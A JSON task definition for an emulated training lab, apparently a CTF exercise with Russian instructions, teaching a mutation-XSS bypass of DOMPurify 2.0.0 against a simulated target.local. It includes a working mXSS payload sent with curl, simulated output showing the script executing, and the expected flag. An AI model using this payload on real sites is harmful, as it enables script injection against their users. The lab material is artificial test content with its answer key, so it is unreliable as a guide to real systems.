@@ -1,0 +1,42 @@
+{
+  "id": "web-mxss",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{mxss_d0mpur1fy_2_0_0_mut4t10n}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: mXSS обходит DOMPurify\n\nПоле `bio` на `target.local/profile` чистится **DOMPurify** и вставляется через\n`innerHTML`.\n\n1. Определи версию санитайзера:\n\n   curl -s https://target.local/js/dompurify.min.js | head -c 60\n\n2. Версия `2.0.0` уязвима к **mXSS**: санитайзер и браузерный парсер строят\n   **разное** DOM-дерево, и «очищенный» тег мутирует обратно в исполняемый.\n\n3. Отправь mXSS-пейлоад в `bio` и сохрани ответ:\n\n   curl -s 'https://target.local/profile?bio=<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>' -b 'session=me' > found.txt\n\n4. Набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция target.local)",
+      "cases": [
+        {
+          "match": "mglyph|mtext|mxss",
+          "example": "-s 'https://target.local/profile?bio=<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'",
+          "output": "<!doctype html><title>Профиль</title>\n[dompurify 2.0.0] sanitize(bio) -> \"<math><mtext><table><mglyph><style>...\" (passed)\n[reparse] innerHTML mutation: <img src=x onerror=alert(1)> escaped <style> context\n[xss] onerror executed in target.local origin -> nto{mxss_d0mpur1fy_2_0_0_mut4t10n}\n"
+        },
+        {
+          "match": "dompurify",
+          "example": "-s https://target.local/js/dompurify.min.js",
+          "output": "/*! @license DOMPurify 2.0.0 | (c) Cure53 and other contributors | github.com/cure53/DOMPurify/blob/main/LICENSE */\n"
+        },
+        {
+          "match": "target\\.local",
+          "example": "-s https://target.local/",
+          "output": "<!doctype html><title>target.local</title>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется target.local.\n"
+    }
+  }
+}
